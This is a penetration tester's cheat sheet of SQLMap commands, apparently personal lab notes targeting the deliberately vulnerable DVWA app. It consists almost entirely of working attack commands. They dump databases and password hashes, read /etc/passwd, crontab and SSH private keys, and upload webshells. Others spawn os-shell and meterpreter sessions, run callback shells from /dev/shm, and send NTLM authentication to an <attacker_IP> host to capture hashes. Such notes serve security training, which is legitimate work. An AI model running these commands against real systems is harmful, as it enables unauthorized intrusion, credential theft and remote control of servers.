# SQLMap

#sqli #sqlmap

TODO: Fill in the rest of the output when necessary

## 01 - Exploit

- SQLMap will automate by injecting queries of every possible techniques by default it uses `--technique=BEUSTQ` and it'll enumerate a backend database.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent
```

- Force the DBMS to skip automatic enumeration using the flag `--dbms=mysql`

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql
```

- You can provide the credentials to the login panel without specifying cookies.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --auth-type=Basic --auth-cred="admin:password" --random-agent
```

- If the DBMS backend has an exposed port when probing the server with `nmap` and you have credentials.

```
$ sqlmap -d "mysql://dvwa:"p@ssw0rd"@dvwa.local:3306/dvwa" -f --banner --dbs --users
```

- You can specify SQL injection techniques. It also speeds up the process. One for error-based query and union query-based respectively.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql --technique=E

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql --technique=U
```

- We can also specify a boolean-based blind query that can be used for bypassing form-based authentication.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql --technique=B
```

- You can specify number of columns after performing [[03 - UNION Query SQL Injection#^78ef92|fields enumeration]].

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql --technique=U --union-cols=2
```

- You can specify the boundaries with flags `--prefix="'"` and `--suffix="#"` after performing manual enumeration in the [[02 - Error-based Query SQL Injection#^bc051d|joining the query]] section.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql --prefix="'" --suffix="#" --technique=U
```
## 02 - Enumeration

### 2.1 -  OS Enumeration

#### 2.1.1 - General

Note: This requires **SELECT** and **FILE** privilege in order to read files externally. Enumerate the user DB account for privileges before proceeding these steps.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --privileges -U CU
```

- Enumerate hostname

```
$ sqlmap "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --hostname
```
#### 2.1.2 - Linux

- Enumerating user accounts

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/etc/passwd"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --sql-query="SELECT LOAD_FILE('/etc/passwd')"
```

- Enumerate cron job

```
sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/etc/crontab"
```

- Retrieve SSH keys

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/home/<username>/.ssh/id_rsa"
```

#### 2.1.2 - Windows

TODO: Provide examples for windows OS enumeration using such as, `--reg-read` and `--file-read`

### 2.2 - Database Enumeration

#### 2.2.1 - Manual Enumeration

- Interactive `--sql-shell` prompt to perform SQL statement queries manually.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --sql-shell

sql-shell> SELECT @@VERSION()

sql-shell> SELECT table_name FROM information_schema.tables

sql-shell> SELECT column_name FROM information_schema.columns

sql-shell> SELECT USER()

sql-shell> SELECT DATABASE()

sql-shell> SELECT GRANTEE, IS_GRANTABLE, PRIVILEGE_TYPE, TABLE_CATALOG FROM information_schema.USER_PRIVILEGES
```

- Banner grab DBMS backend.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent -b
```

- Fingerprint the DBMS backend extensively.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent -f
```

- Enumerate current user database and check if it's DB administrator.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --current-user --is-dba 
```

- Enumerate user database accounts

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --users
```

- Dump user database passwords

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --passwords
```

- Enumerate privileges and roles.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --roles -U CU
```

- Enumerate database schema.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --schema
```

- Enumerate database schema yet exclude system databases.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --schema --exclude-sysdbs
```

- Enumerate current database.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --current-db
```

- Enumerate available databases.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbs
```

#### 2.2.2 - Tables Enumeration

- Search particular keywords of database, tables and columns

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --search -D dvwa -C user,password
```

- Retrieve relation (tables)

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent -D dvwa --tables
```

- Count number of tables

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent -D dvwa --tables --count
```

#### 2.2.3 - Columns Enumeration

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent -D dvwa -T users --columns
```

TODO: Test these last two flags respectively of how it works.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --statements
```

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --comments
```

## 03 - Dump Database

### 3.1 - Dump the whole database

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent -D dvwa --dump-all
```

### 3.2 - Dump the specific tables and columns

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent -D dvwa -T users -C user,password --dump
```

## 04 - Webshell

### 4.1 - Upload a specific Webshell

Refer to this [[Pentesting Phases/Initial Access/Callback Shells/Webshells|link]] to generate interactive weevely webshells and click [[Weevely|here]] for post exploitation section.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --file-write="/path/to/webshell.php" --file-dest="/var/www/html/dvwa/shell.php"
```

### 4.2 - Spawn an Interactive Webshell

TODO: Provide **\[INFO\]** logs and a screenshot to demonstrate a different between a file web stager (the uploader file) and a backdoor (an interactive shell)

Great thing about SQLMap that not only it uploads an interactive **web backdoor (the webshell)** it also comes with the **web file stager (the uploader)**.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-shell --web-root="/var/www/html/dvwa/"
```

### 4.3 - Spawn a Meterpreter Shell

- Start a shell handler listener in Metasploit to retrieve a callback meterpreter session.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-pwn --web-root="/var/www/html/dvwa/"
```

Note: when using the `--priv-esc` flag this is for targeting Windows operating systems to automate using the `getsystem` function for impersonation.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --random-agent --os-pwn --web-root="/var/www/html/dvwa/" --priv-esc
```
### 4.4 - Execute OS Command

#### 4.4.1 - General

- Execute any command

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="whoami"
```

#### 4.4.2 - Linux

- Execute the callback shell in disk

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-write="/path/to/shell.py" --file-dest="/tmp/shell.py"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="python /tmp/shell.py"
```

- Execute the callback shell in memory (fileless memory)

1. Copy the file in `/dev/shm/` directory

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-write="/path/to/shell.py" --file-dest="/dev/shm/shell.py"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="python /dev/shm/shell.py"
```

2. Execute a one liner

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="python -c <payload>"
```

#### 4.4.3 - Windows

##### 4.4.3.1 - Grab NTLM hashes

- Run [[Pentesting Phases/Initial Access/Sniffing and Spoofing/Passive/Responder|Responder]] to grab the NTLM hashes

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="dir \\\\<attacker_IP>\\snare.txt"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="net view \\\\<attacker_IP>\\snare.txt"
```

## References

- [Hacking Articles: File System Access on Webserver Using SQLmap](https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/)

- [Hacking Articles: Shell uploading in Web Server using Sqlmap](https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/)

- [Hacking Articles: Command Injection Exploitation through Sqlmap in DVWA (OS-cmd)](https://www.hackingarticles.in/command-injection-exploitation-through-sqlmap-in-dvwa/)

- [SQLmap Read File on the Server](https://rioasmara.com/2020/05/25/sqlmap-read-file-on-the-server/)

- [SQLmap – Enumeration of Databases & Users from Vulnerable Web Forms](https://kalilinuxtutorials.com/sqlmap2/)

- [IOSec: SQLmap](https://iosec.in/sqlmap-4/)

- [Executing OS Commands Through MySQL](https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#mysql)

- [Hacking Articles: Exploiting the Webserver using Sqlmap and Metasploit (OS-Pwn)](https://www.hackingarticles.in/exploiting-webserver-using-sqlmap-metasploit-os-pwn/)